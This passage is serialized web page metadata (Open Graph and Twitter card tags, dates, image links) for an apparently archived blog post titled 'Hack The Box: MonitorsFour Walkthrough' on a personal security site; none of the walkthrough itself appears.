notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-monitorsfour-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-monitorsfour-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box MonitorsFour machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T12:37:17.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: MonitorsFour Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box MonitorsFour machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-monitorsfour-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1b","30",{}]]
